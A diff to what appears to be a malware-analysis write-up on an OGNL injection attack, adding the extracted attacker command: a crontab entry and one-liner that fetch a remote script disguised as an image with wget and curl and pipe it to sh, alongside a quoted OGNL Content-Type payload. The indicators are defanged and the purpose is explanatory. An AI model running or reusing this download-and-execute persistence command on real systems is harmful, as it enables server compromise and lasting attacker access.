@@ -26,6 +26,13 @@ Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER
 X-Forwarded-For: 5.188.10[.]251
 ```
 
+The extracted bash command looks like this:
+
+```bash
+echo "*/20 * * * * wget -O - -q hXXp://5.188.87[.]12/icons/logo.jpg|sh\n*/19 * * * * curl hXXp://5.188.87[.]12/icons/logo.jpg|sh" \
+| crontab -;wget -O - -q hXXp://5.188.87[.]12/icons/logo.jpg|sh
+```
+
 As you already noticed, the stage 1 of this attack is following next steps:
 
 - Checks what type of OS is running on exploited server (Linux or Windows);
